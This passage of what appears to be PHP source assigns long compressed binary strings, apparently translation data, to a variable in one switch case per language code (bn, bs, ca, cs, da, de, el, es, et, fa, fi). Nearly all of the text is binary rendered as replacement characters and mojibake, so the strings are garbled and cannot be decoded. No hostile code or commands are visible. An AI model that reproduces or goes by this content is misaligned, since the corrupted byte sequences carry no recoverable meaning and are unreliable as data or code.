�f�@�UVs�y�T戊�x�O�7j]�CҤ���1j���s�F��K�\n?�R��CB2!�5p@�Hl\r��1# ��_�r\r��m�݃�;a�0�e�l\r᝱Kp�@ �ɳ�0@�\$\rи0���A�	�8e���a�a#�`祷t�d˔Rę1;����b3�0/HvA[%�.�H��3j��8KH6�x �4�irC<ģH��dp���A�b������z��-�UT�	�8#�SX��%FT�24�3\n#�u\$8T��� r[A�4��6`8g��T��Y�e���*4�K�-�������4Dq\"�L���zm���Q20�HB�K�ѺO	(�=R��y46\$8��Ҝ��P�5�\\�t�!��2'�GN��\\�E9Io��4�^[!��3I\$w��|6F���u�1wJT[�H�d1�Q���T&bӫ?ƬX>Ĝd���'V͔�;���tE1�S�U\\�B�yU���\"�:���g��[B�m1w,��S'm�!-�9�N�l��G)�^�H�vF��\$r<�]�DN�\0S\n!0���U��*P�*^y9'rEy:�+�rGj}\\�\"疪VPW���؀�^BQ+��O�o)�Z	�c�l�ՒLk6��G��[�c̎Y����,T�e��\n~V^��%�{pC�6]P4�!�@�\n�Z]#�L�-\$q�r��'�ڻhp9M�7�3��)\r����8\0�0-�|&�	��R��,�T���>%���/��7!�<ɚ~�I�LtL=cz.�vݚh�R��9�|��js�W��J)�T��*c-��c��T�\n\0+S�s�~��N)���;�P	������	R�7z~��ίJz���VC��D��#�\rJ�-t�\\���F����\n��՞��xV��>��o�n'��m��M㎘���BD�����u&]�Ŋ�M׮��vצ�_���I�����\rR&�������GP";break;case"bn":$f="%���)��U���t<d ����s�N���b\nd�a\n�� ��6���#k�:jKMŐ�D)��RA��%4}O&S+&�e<J�аy��#�F�j4I���jhj��V��\0��B��`��UL���cqؽ2�`������S4�C- �dOTS�T��LZ(����JyB�H�W΢Jh��j�_���\rmy�ioC��Z���N���r,��N��%Dn৮еU��8�O2��n�ŭr`�(:��NS7]|􆇵��8�8:>���n<L�uC�O觽��g�~S+�~�j<�.�����yL�/M��0NB�S:��l��9F�'�1P�B�¥4/�jr��.���.j���6ԫm�T���d��\n�7�-��D-�I�l�j�'��@Ep��\0��3m�P��0� �aL�?	���2�4̙�oKa3��P��	|�2jp�LJ�`�@��}0A/�2��\r,S=���j�q\$�i�&����&�1\\N�,O+��c���m�F�J�z7VHp{~���;��#s�0����P�-�0J�6���SMo\"v��s��K�6���|SS��x�?\r�h��S��S��t���M.��.��J�Nͦ��\n<uE7�y_BH��ڋ	p㖉�n}�b�.��e��W6T���Q���P�Q�/b��{�Q?�;(-���?��5\\�0�Um�O�d�&i:]�N{���|��%�t�_��u�@PH� i��-k��ԧSUPL�e��tE���˗ox���P8J�S�Սt�\$	К&�B���p�cW5��QZm&��)mG�'�eq�m=����\n�ElS)zn=S<F&�J���7��P�t�<Hϫ7�]?K�Q�w�(�W��?� ���X�WՓ��}Cm�^���[P���Vo�m+'��cxG>��E�Ѫ�N�`�93Xf�]�Anh�����MTYac�9��BA�q�b%�@ ����pFǄ�/�@)H�\"d�QC9�����Z���6��g���ʖ�Ǒ	��(h�i�,\"Գ�	^\$�\rH� DH<�J����rd\r��7P���|>�-�d�^O�`�5=>_\n�( \r�2�`z�@t��9��^üy��)EH��xr�2��^xn!�4Ȑ^�AS(n�t����eg��H��O`D?g%u���*�Z�a�m�C�V��q2�q\"+��)�r��9�rP�r����4����b�l˕�T�4�=\"�W�ib�	��Q+�*i~����R;s�#Lk���8�8���w�q�*�) �\$���:HP�#d0\"xL���ʂˌ�\"K�JWYA�'����J��//����y-����E���]y�昸���N���{K�s�򲍠k������oA�*�U������O�.�M��Q��N<?l)Z���J�2�GƐ��oB�H\nZ����*�\n��t`R���f�9�ʸ�a��]+�9���X��@*�Y�0�D�_����c.T��V4��E�Tq*R���]���i`�4K�3�TU�5&�pro�e���L�+��(EY)���Du<��j��Vr2b\"1\0�F=n�2��h�Fufm��*�V���(.��\"^���/�S���P�<ܰiR4d���ܣd��h3l��{�6#�Z�c���8E%�t^^oL�Qg����d\"�S��m�A{QP��D�HS���\n�lKZ\"��}���y�*9՜*Q0T?ZH�-�/\0P	�L*�V��������\"�\n��W�.x\0��`O��zSVU0��\"RE�q\$��	ɤc��`0T�n�S���(}g�0p�cp@L�-\0�CS:�ʑ����L��N�EzE�*�*s#eu���a,V��y^P�cT͔Iµ��fd�j�]F׾&3u����_Z���H�S�6F1hX�X�J̿:ŚٽE��3G\"�%��kT�������M�r�����{�3�M	�9W����݃�	ժ���2�6EL]:!���\n�D��Y5\r,�A�G\n�P#�p�L�aQ��)SEL���O��#lZ�^�F��&��Tc��y�u7_��_��-�ͣ�q�9�� �܎J�=ϰ����Y���|P�ޙ�\$62�VڠZ�Q,3̺PCLnR��\"�L����H���mJ����xm��We<_r�h�0�-N�Й^qb�ť7�_�I�e��*�t�yP?�MT�P[�~b���>X��V��Mn�C���@���x�٩\r%�0G1��^(�UW�`�\n�'ZS�s>rzy�B����'�7��;\\�)��,�r,���5G+�+���V� ";break;case"bs":$f="%���(�l0��FQ��t7���a��Ng)��.�&�����0�M磱��7Jd��Ki��a��20%9��I�H�)7C�@�i�C��f4����*� �A\"PCI��r��G���n7���+,��l�����b��d�Ѷ.e����)�z���Cy�\n,�΢A�J �-�����e3�Nw�|d���\r�]�ŧ��3c�X�ݣw�1�@a���y2G�o7�X���搳\$�e�iM�pV�tb�M �U��k�{C���n5�����9.j��c(�4�:�\nX�:4N@�;�c\"@&��H�\ro��4�n�\r�#���8@�@H���;���*�\0ߨ���\r�ò腱�P������.\"k\$b��#��{:G�s�h�l5�Ϫ�ұL��H���KDl:��\"bV�(�P�*���5'-��I�s*���KI��a\n5/�E	CO�R) PH�� gL�)�ƭ�<�14�h�2:���rzڋrp�5�h���/���9�# \$	К&�B��IB�h�c͜<���\\���`�J\0@6�P�x0��%-F0����|�[��7��2��]�tVէچ�/�=�O�bۡ��灌��\$7cM�9�c��\r��0�\\̔H3ɢ�ܿ�(�	�D�!\r�hڄ�(� :�cT9�èذ\r�:p9���嘌5�~�,0�:�A@���62�)�K=��\0�ο\rXͅ�I��#&��h#&4��-��2C0z\r��8a�^���]^��\\���{����z�}ġ��w�B����\rUl#�քh3Ӕ��jU�ʣ�P��\"X(�	B��M��K%xѸ�{���{��������\\/����\\\"H�84�`�:rx�4D�e�0��, �Yz�����JY���2�2OH���h'4��CBC�?���3�\0h��_|�MsgZ�٫7g,�3��A}�0��@ݹ�>�݊��J���O��Ǻ�ߪM\"�d(��\n*\0�J�j!\$�y��\0[�4f�Ӛ�L����5e�r<̙ 	���\$ü��Y-7		�1�h��#�f��\"N�LB!�	�P@͘c�&3�UC#t\$h2Ũ�����8�)� ��(.	̦�&�1p%��-�<d�y�1p�2���Yxl\"�)��XK��i�%,�� @�	�7�yC0�JHyc��� � �Cr&6Q���j��f@m��5(�t�j3��S'��=�(��9�H`��2A1O,o��R��!���\$��-��z glDϩ�E�lͫ���\n���0�\$ᦟa���`�\r�J&CQA�Iɦ���&7%�;\"�:�;\0&4��R��aL9\n1\\)��T���r↝��II������5!���Բ��-PP'�\$ʘ��HCJ�����q��;��?��N	�u\$�-���` \n�P#�p��T�<u;yHFI,^\r���;u\0f�݊��%ۧ�ddIp��m������/��6S�aI��\r��w�@d�Ǯ��czҹ�G����kNLٕ�h����jI� O�l5��:K�q�ޖA��*qk���=����A�L�E�aL��2a��D�9	.!�T�~a	hz1W�9.2ړ�%!�͛c���I�Hɩ�W���K�";break;case"ca":$f="%���(�m8�g3I��eL�����a9����t<NB�Q0� 6�L�sk\r@x4�d�	��s��#q���2�T���\0��B�c���@n7Ʀ3���x�C��f4����(�T�P�fS9��?���Q��i3�M�`(�Q4D�9��pEΦ�\r\$�0��ֳ�X�~�`��6#+y�ed��y�a;D*���i��������+��p4(�8�\$\"M�<��k��X��Xē�YNT��^y�=E��\n)��j�o���M�|��*��u��4r9]��֡�횠: ��9@���9��Ȓ\nl�`���6=�:*��z�2�\n�&4�욊9�*Zz�\rI<H4���H���*������̈��;I�!/H����Ȉ�+�2���\"*\r#�&��!<&:�K3��3j�/s�qL��;C�\"\$��H�4��b���f�O�L��&�����L�������\0�<��M!IR�0�#*\0PH�� gP�3bD�I8�0\r�X�7��`�7�`P�9'K�Ja��M �s��@!�Q]#��\$Bh�\nb�2�x�6����m�\"�2��Js\" �2Q	���£̨�>�2\"�#�x�!�Iu]�h܏-���|�n3�8���`��4��6sD�2ŉ,9��d�4�20�\r�0�P��D׌�#�1�48Ƌ�B�ި�Cp��c��>�XAY�,�1*�c�0�X2�H�#t42��R�&���C�`�\\�H*0���3aЛ�#&��C��#7Sʌ��D4���9�Ax^;��r%��k���A~Z���H^�{��`w�J��h]Y���4�O掻/h�\r;O�[C�h&�ʪ3!pmq�t�,n�F�o���p��\r�/I]�q�w�X��]�<+F��\n��@�H����5��9g4BI!��Z ���k�}�P�\r�D����la��f��\0w6p1��c�\"!�� V~B�\n�\r����n��8&�pʫ��_�C1U��0`�х0��&,��P	A�r.N�((����B�M��f-���SXk��l�P��#B��!|Va��>�Jv��(`�ؗ!ȁ\0��(Nq7�}�oKH%��\"�c��3��\$D#��(L߳P���C\naH#F8�J�p f��ԣ �k��)e�6����9�Aj�����L�(%��3CB` N��ʨ�.�� I a���U\"���n|��W�U��L͵�B�ՙ�|1Y\"H\r�+�\0�(�\"~>�ȅ�p��L��\nN�:��k6��Q/R��d�N]�Ȁ�\"�\0[�3���^�c�m��uA��\0�Ba<!��L\0�!�R\$�d�R{F���	B�1}O�FKiA(���C���]I���\$D^�zZ�E8%��4����?\"���:O8�%F?�>MOP��B1�\"��!�P�\n�vuUn}�7nS�mQN�`�2H���5�P��h8a��ǆ��KΉ.���h�M�M��� ����1�&���9�Z�*w\\De=���yZmd�B`:�e�2`)�Ԇ��C���Y�)�=�XN����a��a�����J�Ui�&�Ȅˑ_N�P1�蕶K!���(H����ʤl��R׀�Xtv�ٛ�M��]P����f�\rS�9�v����*H;?\\b2\0��@�";break;case"cs":$f="%���(�e8̆*d�l7��q��ra�N�Cy��o9�D�	��m��\r�5h�v7�����e6Mf�l�����TLJs!H�t	P�e�ON�Y�0��cA��n8������d:��VH���+T�ت���X\nb�c7eH��a1M��̈�d�N���A���^/J��{�H���L�lP���DܮZe2b��cl�u:Do��\r��bʻ�P��.7��Dn�[6j1F��7�����761T7r���{�āE3i����Ǔ^0�b���穦p@c4{�2\"&�\0��cr�!*�\r(�\$B��%�k�:�CP艨�z�=	��1�c(�(�R�99*�^�F!�Ac���~�()�L��H=c(!\r)���<ia�R�B8�7����4�B���B�`�5�k��<��\"�-�����jp	R \nh�4;��ގr�95���8NS�2�&k��ռ(Kp5�A(�C,�ԅ%/Ҕ}#.`P�7\r�T��\\�8b�N�C�5��b4��ʆ�3(&\$숂5�/p�9���G͂@t&��Ц)�C \\6����k�B�b:����h�9��\0x0�����(�2��x�\$W=�'0��4��\r�7�H9�(-_(a}�jr>�&f�NԔLЩm�a�0�2���1bS8����0̜�JP�>e��AŇ�L��˵p�B\"��w�g��B4�`@=h9B����\\6�ңl��6�No��9�۞���W�v�A�8Ε�\\xcc����Q����0��.V�I��7�����vi�%�^��j����D'�z>��%�x��N����2즂�%�&�ߡ0�sr�#&헎�U�C(��C@�:Xa�^��]\\��\n@3�����z*:\r>p^�9�\r\$-x^A�(�e�`5eÜ��&�\0�B\r���Nk��O<� V�Z�����@OPC�4D����b�K#�?k�ߑwl�Ӽn��<'��Yx.x�%�.�8nzk�\$���L��nEl�zB�GiF\0<���Cȉ=%!����M n.�q�P��Wq�&*T�%~�T�uV/؛�*p\0�O`�������r�����J��Vl��\n�Јi�\"腆��H��{�lQ�\n��H34��c��]ig\0002 S�� \n (�v��s\0������HjQ��\"2ȭxe�=��@�@N`�ĵ@f�C��q�6�����<Ni?! �\\�y���:4��Q��<�./���D҈ze��@�s[xk&`�!�0��p r��P�&��h�e�5\"D��l�h��I�yI1�%K�Z�)�Bg�I;�t���_�,��	0`�ؔxji�}����K2\")�%���^+�/��rĤh.�;G�/'��|k�ԛ�3�xS\n��P�R�a/�9�P�\"�R�5�u�/��p�k�5.�5�\n��V'	p^�\0�Ba#�6c�����#1\$6���KB0T�����Sb�*�K\"i�\$LN��Q�B|���yC�\"�E���cM�]�����GdӅ�1�1pYw�M��3���}�rh�tie���@k!��V����U+dE!d`��ϒ#n���\"6��2\"�H�0\r����y\\A1%�������Q�]�L=DJb�5kE�rٖF��\\o4;Y%�B�F��{ϐA_e}��W�\\Kq�6����(�	m[ͬ\"8\09W�%r�uͭ������D�[���4y�q�O2���_��\n� ;�y1A�/�u������B�0�(�9��.5rD0�D`�N̘���&d�Z\ny<t��(��O	�v�(!���M�\n5�o��B�CZ�2������Z�	�\0ȃq=<W�	t0V*��e3��\\'�C�Q�;3\nt7�\0�";break;case"da":$f="%���(�u7��I��:�\r��	�f4���i��s4�N���2l��\"�ц�9��Ü,�r	Nd(�2e7��L�o7�C���\0(`1ƃQ��p9gC�9�GCy�o9L�q��\n\$���	)��36M�e#)��7���6�遹�NXZQ�6D��L7+��dt���D�� 0�\\�A��Ηk�6G2ٶCy�@f�0�a��s�܁[1�����Z7bm��8r����GS8(�n5���z߯�47c�No2��-�\"p܈ә��2#nӸ�\0ص%��0�h���&i��'#�z��(�!BrF�OKB7���L2B��.C+��0��2���b5��,h��.ۀ:#�\0�7����N�;\r�0ދ?�P��-�@���HP��\"k\\�'-b�A(�S���DԂ�C�\r@PH� h��R���@�k+6�:��\0&\$#K\$2c\$�\n�(��è\$	К&�B���zH-�e-SU���J�ԻN�̯�E��\nt2�&�Ai��<��x�#u�v!��r03��-�c®<*Ǩ���j�U���N*qp���T7\$l9F(���B�ޮ�-0�3Ԛ���,C)�ìP*\r�\$�<�C�1�o��3����abJ9a�0����6���TaJ7�4\n6\r�ʔ:#b��ɣ�:��@ ��9b��4���r\r	���CC08a�^���\\�����3��\0^2Y��f��}�-�2�i���t�Jq�\r�z���Q��8�ʨc���hZ5��+�nXM%�F�pA��#.����������z�kC���\\�>��bHډ6*T9m�P@�,��mq�M�pЄ:^�\"��9K=r6)��������kt	�c��R��bʹMf��O4!~t�L�g^��f�bM�;��BK�c�m�\\Kr.&%�f��Qt.�0ӑ �i/3p\0�k��X��PN�K�3��S\"����a�{���C�`1y.i���|���e��������lH��.�t�Ȑya�#��̊<74��լ�HYl�����8w\r�1�f@f�w~�,1�p���A7�!�0��id!����r\ng|渎�@H�!�5f|30�Рo_��5���h���o����6Hy^f��0�}d�(��2��|Mf:䑞5�q\nc\"g��ʳ�\\�\$���<)�Efj�l�&�RK9\$��J@m4���2��J,)\n\0��`L��A\r(Uì՞��͐�@=�DH�&�,���B`-A�\0\0��%!��E<�,��_�\"������F�����\nDH����ZB�%w�T�����ULD=�&��I��p�!����Xla�����]�6тq��@h� d������L�B4ӌ*�@�#�e�'�zJ��X�)N4��Z:�q�1���PG�Y�1�)\$=��]K��I�CT\\�q�\"�(�����Q�/�\$�Ċ�j����T��jk�D��	��emh٫0.>���%Jl���d}�}0鶰���mK�-��Ä�&�B)��·:��&f����CX[�D5�T�@";break;case"de":$f="%���(�o1�\r�!�� ;��C	��i���9��	��M��Q4�x4�L&���:����X�g90��4��@i9�S�\nI5��eL��n4�N�A\0(`1ƃQ��p9�&� ��>9�M��(�e���)��V\n%���⡄�e6[�`���r��b��Q�fa�\$W����n9�ԇCіIg/���* )jFQ`��M9�4x��� 0�·Y]�r�g�xL�S�ڸ���@w�ŎB����x�(6�n�Bh:K�C%��-|i���z9#A:����W��7/�X�7=�p@##kx䣩��*�P��@���ȳ�L����9�Cx䩰�Rfʡ�k��1Cˆ����:��)J\0�ߨH�Љ\$��������6(��R[�74ã�!,l��	�+8�CX#��x�-.�+	ƣ�3,q��=+^:DS8�3��=��	�xα�S�C�����K#�ˎh���(�<��M*R�\n5 R�B��\\�8b���+���hě�SR��0���\r�;��\r(�o���n�\",`�-S��\$Bh�\nb����p�5[�P�a�m�����%(9�k�t�\n�/A\0�9>��@�'%��5�����|�]�x��M�8��`�t\r�V���\0�ߴ�b7�M�-�!�^�����%�jE����\$�dt�\r����-.p�3Պ�ϥò� �S؆���o��	�\\3\r�`�6\r�A@�cpZ+%ÝZ����L���Y����'��&�q�|7!BZ��C`\\�H��������j�����z��lR�ɳmC���7�N����v�h�0ɕp<t�(�X�C�C@ �����S�_�\r�и0z\r��9�Ax^;�r�%�tD3��o��\"���A�ix���s�78n��U��9��\r���`�\r�mg�p+�h�s���WA&<a��d��ѸO��?Gt]�ew��<G����v%����Axe,��'���Hm��ҿ�>,�5�������\r5������R�(F�t�R�`���B����\"tH\n\0�)��JfJ�c��(�bX�a>+\0�=��tFt�Eӝ���Z;�b%	�ؿ�{���p���GO0hDd����@�Y9�eF���V�Jq���t�Ġ�i��1NDR�M ((���� ��dF���X��^�ݲ��.[�N�I���b�T�	0&D���s\"�V<y������\"�\"H�\"��L��W.�c*�~�r�4a���p�k_j膡UDbмCY:@�X�0��0 \n����{1��gl)Q�CP���QMK��W�_��Q���\"���0_q2�A�=\$2X�PCG@�\$ȗ�,BK��\$n4��\\	�G\$�\\�92|�ڰA��ЎƂ�P�J�n��c*���~���xک��'�U�@�T�\\�K	gQ[1<l&�ч�A�>�䝓�Z�Zr'꧝��k�%4Q�1�3ɻ�F�Ol�\$�'���`�*�#��@�h[�{�y� IN�\"�r�3|8'�@�a\"�9�,��S\0N��\$R�;��|GLԪ�k��)8�m�jiŎ@Ή��Gf���l��p\nl�6���WܳI�I�R�+Ҟ���u\"\0@B�F��ұ�xA�\$Sv��Z��i-1Now�b�6go��%6���@���x:e�X84G� &La�Ktc(�6\$A���暯0�\"�'d�T+�fIB�)�Fu�%8��9�Ho �r�G�&��U�nY�0)�t��P ��ԙ�4YT��F������B�\r��&4<`H\\�T)�́VV�>���X0��xf2��,!��[�~\0";break;case"el":$f="%���)��g-�Vr���g/��x�\"�Z�А�z��g�cL�K=�[��Qe�����D���X���ŢJ�r͜��F�1�z#@����C��f+���Y.�S��D,Z�O�.DS�\nlΜ/��*���	��D�+9YX��f�a��d3\rF�q�����ck[��)>�Hj�!�uq�����*?#B�W�e<�\$��]b��^2���n����>���z<� ��T��M5'Q+�^rJ�U�)q�s+4,e�r���5���-���3J7�g?g+�1�]_C�Fx|�-U����tLꢻ)9n�?O+�����;)�����I�j����t��P#���0\nQ!�s��'�\n|W+������I�Hs��H<?5�RP�9�~�%�3���ٞG(-�4C�OT\n�p�7\r�����7�I��0���0�c(@2\r�(�K�:���9@�;�\"�P#�K[�Dr�())JN�O1~�+LR0�=�8��*��ªqt�.�:�M�c�δ�izb��m\n�������:���ĺ��Q�n�����Ir\"MUq�љĤ ��E>FH	�>�!�dh�����ӷkA�F�v%��P��(ͣl�7*���}���*�)(WQ4��.��� �Ƨ�(̦g�bFDfvF�\n&N���,�'����(�C��2�9I�M�3X��I`\\�A j���p���mt#tT~��ꄚ��Jں�4__97R@���c�9��GpݏAv��l�=&PH1Rg!ќM�{S�J ��n���^-�*v�.�뫯����a+�{��\0R�\r���9�\n�C(�:�R���K���|�r<��7��0�3�/A�T�\0�-���9��d�������s{Ō��N7cOQS �cPA�� �:H1\$ӹ1���6�>�z���.m�!>�:����\n��8��z\"�����\$��ʴJ�J1@[\n�H���x�\n�@�lנ��\\�)@��s.���բ�c��ZI)D�F��J4������!S~4��eyK�R���6,J	Tp��)#�\nx���2��2R�جVg����|S�كKy�fL	6\n��͆����va��]�]���冐ȗA��ʆ`z�@t��9��^ü���7�8/����~T�@�K&H����A�X�����	���db\n4D�}Ȃ��o���tR �\"+�.E�z�\\�Pɑe�w	�{�<��c���rCȐ�\"�hnK��HI)(�^;�u\0�95��̑�\\���Y@|���'�QG��I�B;�U���H+'C��8�(��r͚&<%�����Pʎ=�1�]\"��=S��w�)\nt�(�8�� К�c��p�c\$MA�.ƀ�C+#!���\$��na�:���;����:�ASSS��\0�1�X���a\r�0g,� D�	k��k���W��aR�|�*J0���ئ-�Ч\"{�T������ ��ZW��8�����EŹ6t�mR��S�x �4�j^C=9�I�7�t�ӕZ��ޜ�����'�- �sz�Oz蘂Ɠ%��i�psO5�%��qC�uO	�>&F�@iu:8yL�}'����RΑ���<h�ȩ��X�S\nAf1#�L�Q�_�̏55�*������,�4�EI��rJ9�m<��R��OB�*�4����v�)P�AK���t�_��ڳ��y��q���[9,1-���0|�Tn�h9J����N13��/)��Z6��(���J�\r�P�T��qU�l�P��De(`��a!���5�?�	�#l��2D�0��Dx��#\$�^�[ف�BD��\\�hR��\0��~���)��<��*X<�O1D��#s����-�%A��\$+�8��u\"2ӫII.�_��c���H٧3�D0��>�#���F?��\n�9'��K\"�J1))%:�C\\X���)��hQ6�v]8x�2��Ƕ|�9@{���\r��1�ˤ�Z��Jh���54>�)GN��QZ�(zH���6RNf��#�?2�U@�Q�O�0-�2:�P5Ո�[Sd�fU��Ex7��j�P/NqС�(��Y���yo�:�V^vI�7����?AL��^9\"ł�������+�/��N\"�9,B�|�c1�A����'Mf�\\Kp��ȏ?n�7˅V�\nY�1���y��r-������{`6��7W�Ď�#f`ĉ�_�F�����F���E�Cx�F�L?\"]s��\"���O.���y/F����\\+!%y/\0��#Q7� ���9��C������p�<����G�d`5�Pf�&�)`�=���Rw�%�PY#\\�PB�";break;case"es":$f="%���(�oNb���i1���g�BM����i;���,l�a6�XkA���<M��\$N;��abS�\nFE9͎Q� �2�NgC,�@\nFC1��l7AL%�\0�/�L�S��~\n7M�:8(�r4��Fd�J��x���#&�̆�1�*rL�+Z�	�oX˕.�ifS ��{4�g����C��cp�t:�\r'��*O{0�dd}��Ɏ�E��!�(o7-[�NNn2�\\��Aj����H}�C�2��f5�Hl�\\���S�9㈧+/js1�\r�3OFF&5�����~:5L��7���Z8/Ø����3ȷ��\0���s[��� ���B'��@���+Z��,�F'e��2��P�2��k�4-�!�)�DOP��\nL�2��(�9el�*\r(j���K�����<9��zH�-���nD��r0�7�Cs�޸n;�9N���'�*s(�������4`AG)�(�-�H�� gN�2;����g=:.�&���{|�1�cҦ1#KS�L,�2%\0	@t&��Ц)�C ���h^-�6��.�B�jؽ\r������M@8С\0x0���Q�:�H�(6\r��^0���t�#s\n����|E�[%��b\"0��2�F��z�b\nLQ'��S���(�+�\nc:϶њ��c�\nF)Ǎ3��q����4�&���T�/0D��V�R\$۪b�RCk��e�PӝC+��\$���@a�)����@�7\rhX�C�P�#&���P���%�\r`��C@�:�t��I;|x-�8^��H��9xDrNRׁ�/��\"�&{�C�,4���PƸ@H �D�����*CB0�|%-���M\0�\\�n�2�{����|/ĭ\\_Ǎ�x���\$���%���J�P�^�dx��2�X>R�lCN4����HYAE,t� \"�c���PԐ��Dd(8(V�u�Y�>'ڨbPd�SZ�������?�я��q�ђg*�'6���#�!�����A��	�POI:+�#RZH�MTLt�����)�5F��r�RJ	!,�@��ӎS�\$fi7�P^B�vf�1�h0~O�@\$�\$��	�?� �R6��B�u��5�C*;0嬆>ˀPT\rᭃ�0��4ļ�<@��Cc#�,���ܙ�&�m��p�K�\"\$��:�3%�c�)%��bJP1\"�v-���Hp.\\�:t1%�JE��4���\$H�����#�\r��L���:��r#�'41�% �d�P	�L* g'�4`: �Ŷ2k4���DU3rRJ�C�d��Scl�@�q�H�&ٚd�B�.Fd\0S\n!2�(T��\"a*D&L�i�}���h̋y#Q���c҈��\n�fX��#a�\rB��1��x�eҒ���l� ����3�n��z�k�	�i\\6��a�b1����C����\"�П��`NW\\k�I��aH��/AT*`Z	�2��S��Xl�SQD.� �ƍ�Bd!�@�\$���5��������uFH��Q-�S���NT�\$l�[��g3ST����d��mSD'y�L�N��\$��	|�H呓\$�B��X8�t� �fTIe�@����\n�-;&H��wK�rc���1	�y�КY�/�*�[R��G\r�r%B5Q�";break;case"et":$f="%���(�a4�\r\"��e9�&!��i7D|<@va�b�Q�\\\n&�Mg9�2 3B!G3���u9��2�	��ap�I��d��C��f4����(�a��L�A�0d2�ࣤ4�i�F�<b&l&+\r\n�BQ(ԉD��a�'8���9�\rfu��p�N�I9d�u'hѸ����&S<@@tϝN�h�g��P�9NI�9�;|)�@j��jC�,@m��\"��ٳq���|�����F�=ZqF�̶�`�*��y㹸@e9�Rr!�eX�\r�l���#���8+��/��H:��Zh�,��\$4��k�§C�|�7����[־Hē�è�1-i���5N�;:*�-\"��#H�Kp�9B�B9\ra\0P���<��B8�7��走\n�0�)x��Q�)+iSQ\"KO<��\"�D�#�P�7��#�BS��;\n䪰���+Ð�2�A*���MQ���<�\0S<��\\��b	�X2c@��L\n�-`P�4�#�\0*4��p�2t����@�	�ht)�`R�6����e�\"슉�`�*�Iێ���ÕN�=�`A!�C�x�!�Om[��7�bl2��L2#��A�hլ�=�r�_��2�\rhܖ]����d�2�Ć�\r�0̅#-���H����c�������!�c 9�èؼΈ��4�Z0��C�|����2��R���+�6g.�4����r�\$�4�'#6\0�#8@ �h��xl|�[-��o��D4���9�Ax^;�r)�Ar�3��^�`T���A��l7����cNR�]�I(��6A�����ë\n���Hʓ�-��12r�<��m���n���o�����<�.\n�HEn	#h��ʣp��^�^7��C��#J*6�ehϭ�1<��|l�(+YZ�>�>�S\\c��Nn]rk��*����kf�ĳVn�k�(��ӿ��R� kx�=`�IpE(e����C!�r�ɐ26V�`�n�����N�J�P	B!D,��J'm,.�_�a4�|8FiLz�'0���0����A��Է�Z�+k���W�|	97��3%�{�{�\r�A�Wd�gpP��v�\rs�a��:�T�YYF)� ��Y�#���:@�Z�k�t�VK��\$d�P�\$4hCHy�/n�:�M��h���L� \"�r*�Car�.� �c�&[#���V\r5	0	�4��(�j�{Di���2B��?��VI>p�4�t�h�NrE8��ꖄl4\0Za% t2��A��T�y�L-�)��L\r���#Hx����Uk��Ld�A��\$�,簾�C�Gj�8*�ieGڣV(�8%���q[�.q9VJ	jMP�B�t|��|i�V��Òr��J���J��a'�\$�D\0�B�T��0�EN�'z(��*�Yk%̰��&B��eC��«p��Hf (ŵ�fI��\r����`*�@Rk�z�J���O���¼Iӛ�\r����cfk�	��S�PwM#;!P�BJQ�;6�U���a˫�E�-�.��J�!h�h �*XWS���ȉ��\\��p\nH�:��WIi+�";break;case"fa":$f="%���)��l)�\n���@�T6P��D&چ,\"��0@�@�c��\$}\rl,�\n�B�\\\n	Nd(z�	m*[\n�l=N�CM�K(�~B���%�	2ID6����MB����\0Sm`ێ,�k6�Ѷ�m��kv�ᶹ�![v��M@���2�ka>\nl+�2H���#0\n�]SP�U!uxd)cZ�\"%zB1���C2���o\r��*u\\�o1���g��{-P��s���W㤵�>�--��#J��K����<�֋T��s��F��T����/\nS0��&�>l��`Q\r{US!\\8(�7\rcp�;��\0�9Cx䗈��0�C�2� �2�a: ���8AP��	c�2)d\"���rԢŒ>_%,r��6N\"|�%m�T\$͊S%��楨�J>B�M[&�%ES��<���H�PW;��'ﲲZ%n��S�,����+>�'.r%!�����R�@��ȩb̻)Ah�!�2�����t�>��8���&�\"��KML�5<��B�P��*����PJ2<n�T�umF�\"4�����H�� g^��[�ȑ2�Xόd�ز�́>2��ئ�]N��ˬB%QT�G���Ӊ\rB@�	�ht)�`P�<ރȺ��hZ2��q\"���UP��:�p�x0�A��2�����8�0�!�^0��~��cx�3\r#>\$2�X�=r44�p��\n&A\rٖi����<�(�9�9��[����! P�:\r�i!!�@�)���\"�R�T9)QcK0ƨ��«�3���(:)A6q��j��bƐI���\"2�Z�0#�@�1�;Sm�F�Anl�i�����Vo��\0W����ځ!q;h�:ܖ㾳�Rq�%b2tP�4b�\\23f�C�3��6�p8Xz0�2@�\rx��C@�:�t���>?��C8_��r:h�p^�t��8�\r7�1�t�Qi�)���]\n9�2MuM�\"��\n��M����&�a�y�!E�ệ\0B��.!�ݳTt�ިez�e�׾�_�y�����ߓ?h-\r��66E��q�<�2:�TQY?���c|��F/��!,3�t�#�U�#��D�(��ByI�%pDܗ\0�v�c~�p�` HP8 w��heU��34�CcC�3X�xge��:�A%P�1�/1��\0��lh��\$nۍ��Y��\"�|�������IL��h \n (?�J\"�'#ɾ%��d\nRZMS��B��,�ѹ/d!�G'�%�x �4��f��D(e�!�އ%��	)�IVmѩA�=Cʔz��|oa����S,@�b�\0ꈑ\"&J�;������j=!J��H)� �6[B��U(�g`QQ���I��rjW4Vn�	>��R�*Ā���rlVR^6i��nV��*���w-Mӗq�X\$�0�êy�!0ܫ\$��a��:��8�Hmx��Hy0�C�Br^�!�G8I6*j�+D�]`�~K�b���EL�ڝ?e>��T��E:kvd���C�j9tQ�.DQ�^)���Y	Zꍂ`Ih������\n3Y\$�L(��3<�r���ć�u܂0T��h���Hj 0�s\nm6DK�OS�Jp�6�*'b]\\��56����U*~2M���	�w	|&��N�;Ъ����,��mz��Tw̹_RvOf!ɰM��+��x�gq�2����luƇ��k��L���ؙҟ�U\n���Zg�{4�B�,~nu�2B��zu���L(��0#�p�4d6�_�E�屉0p�C��������NM�Rn�6��39���:�6xB�Q�1��B\\ul���p�(\$z�ɻ�&ѧ�����P�1�V�qDmr�RE^���I���\r���/�x�n�wT�͟t���iūF\$������F���~�\"�Md���X�r._r����";break;case"fi":$f="%���(�i2�\r�3��� 2�Dcy��6b�Hy��l;M��l��e�gS���n�G�gC��@t�B���\\�� 7��2�	��a��R,#!��j6� �|��=��NF��t<�\rL5 *>k:��+d��nbQé��j0�I�Y��a\r';e���HmjIIN_}��\"F�=\0�k2�f�۩��4Ʃ&�å�na��p0i��݈*mM�qza��͸C^�m��6��>�����㞄�;n7F�,p�x(Ea��\\\"F\n%�:�iP�n:l�ن��h�A��7���*b��n���%#��\rCz8��\nZ��#Sl:�c��٨���&��0�p*R'�(�B�J�m�@0��@����L7E�^ԥ���+G	